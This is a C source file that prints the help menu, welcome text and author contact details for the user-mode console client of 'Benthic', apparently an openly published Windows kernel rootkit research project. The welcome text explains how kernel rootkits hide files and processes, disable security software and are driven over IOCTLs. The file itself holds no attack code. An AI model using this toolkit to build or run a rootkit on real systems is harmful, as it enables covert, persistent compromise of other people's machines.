// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://en.wikibooks.org/wiki/Windows_Programming/windows.h
// The primary C header file for accessing the Win32 API is the <windows.h> header file. To make a Win32 executable, the first step is to include this header file in your source code. The windows.h header file should be included before any other library include, even the C standard library files such as stdio.h or stdlib.h. This is because the windows.h file includes macros and other components that may modify, extend, or replace things in these libraries. This is especially true when dealing with UNICODE, because windows.h will cause all the string functions to use UNICODE instead. Also, because many of the standard C library functions are already included in the Windows kernel, many of these functions will be available to the programmer without needing to load the standard libraries. For example, the function sprintf is included in windows.h automatically.
#include <windows.h>

// https://en.wikibooks.org/wiki/C_Programming/stdio.h
// The C programming language provides many standard library functions for file input and output. These functions make up the bulk of the C standard library header <stdio.h>. The I/O functionality of C is fairly low-level by modern standards; C abstracts all file operations into operations on streams of bytes, which may be "input streams" or "output streams". Unlike some earlier programming languages, C has no direct support for random-access data files; to read from a record in the middle of a file, the programmer must create a stream, seek to the middle of the file, and then read bytes in sequence from the stream.
#include <stdio.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "Strings/Strings00Me.h"



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief      Displays the main help menu with general usage instructions.
**/
void FunctionsHelp_ShowHelpMenu()
{
	// ---------------------------------------------------------------------------------------------------------------------
	printf(" \033[0;32m[+]\033[0m\n");
	printf("    * help         - Show available commands\n");
	printf("    * banner       - Show ASCII banner\n");
	printf("    * welcome      - Show welcome message\n");
	printf("    * contact      - Show author's LinkedIn profile\n");
	printf("    * techniques   - List available techniques\n");
	printf("    * clear        - Clear the console screen\n");
	printf("    * exit         - Exit the CLI\n");
}



/**
	@brief      Prints a short welcome message with project name.
**/
void FunctionsHelp_Welcome()
{
	// ---------------------------------------------------------------------------------------------------------------------
	printf(" \033[0;32m[+]\033[0m\n");
	printf("    \033[0;34m[?]\033[0m %s\n", STRINGSME_MACRO_PROJECT_NAME);
	printf("    ---------------\n");
	printf("    Hello ;)\n");
	printf("    You are using one of the key components of Benthic, the User Mode Application.\n");
	printf("    This console application communicates with the Rootkit to send commands and receive responses.\n");
	printf("\n");
	printf("    \033[0;34m[?]\033[0m What is a Rootkit?\n");
	printf("    ---------------\n");
	printf("    It is a sophisticated piece of malware that can add new code to the operating system or delete and edit operating system code.\n");
	printf("    Rootkits may remain in place for years because they are hard to detect, due in part to their ability to block malware scanner software.\n");
	printf("    ---------------\n");
	printf("\n");
	printf("    \033[0;34m[?]\033[0m Demystification\n");
	printf("    ---------------\n");
	printf("    * A kernel-mode driver operates at the highest privilege level within the operating system, allowing it to modify critical system structures and functions.\n");
	printf("    * Kernel-mode drivers can be legitimate components of the OS, but when used maliciously, they form the basis of kernel rootkits.\n");
	printf("    * A kernel rootkit starts with a kernel-mode driver, typically written in C/C++, which compiles into a .sys file on Windows systems.\n");
	printf("    * This type of malware is highly dangerous because it integrates deeply with the OS, making detection and removal extremely difficult.\n");
	printf("    * Kernel rootkits can intercept and alter system calls, hide files or processes, and even disable security software.\n");
	printf("    * By operating at the kernel level, a rootkit can effectively conceal its presence and maintain control over the compromised system.\n");
	printf("    * Due to their privileged access, kernel rootkits can subvert the normal functioning of the OS, leading to significant security breaches.\n");
	printf("    * User-mode applications can communicate with kernel-mode drivers to send commands and receive responses, facilitating control over the computer.\n");
	printf("    * This communication is typically achieved through IOCTLs (Input Output Control) calls and IRPs (Input Output Request Packets).\n");
	printf("    * As a result, the user-mode application can interact with the real key rootkit component, the kernel-mode driver.\n");
	printf("    ---------------\n");
	printf("\n");
	printf("    \033[0;34m[?]\033[0m Resources\n");
	printf("    ---------------\n");
	printf("    My Public Bootkit    >   %s\n", STRINGSME_MACRO_GITHUB_REPOSITORY_BOOTKIT_ABYSS);
	printf("    My Public Rootkit    >   %s\n", STRINGSME_MACRO_GITHUB_REPOSITORY_ROOTKIT_BENTHIC);
	printf("    Awesome Resources    >   %s\n", STRINGSME_MACRO_GITHUB_REPOSITORY_AWESOME_RESOURCES);
	printf("    Setup Environment    >   %s\n", STRINGSME_MACRO_GITHUB_REPOSITORY_SETUP_ENVIRONMENT);
	printf("    ---------------\n");
	printf("\n");
	printf("    \033[0;34m[?]\033[0m Help\n");
	printf("    ---------------\n");
	printf("    For a list of available commands, type 'help'.\n");
}



/**
	@brief      Prints the author's contact information.
**/
void FunctionsHelp_Contact()
{
	// ---------------------------------------------------------------------------------------------------------------------
	printf(" \033[0;32m[+]\033[0m\n");
	printf("    Name:     %s\n", STRINGSME_MACRO_AUTHOR_NAME);
	printf("    LinkedIn: %s\n", STRINGSME_MACRO_AUTHOR_LINKEDIN);
	printf("    Github:   %s\n", STRINGSME_MACRO_AUTHOR_GITHUB);
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
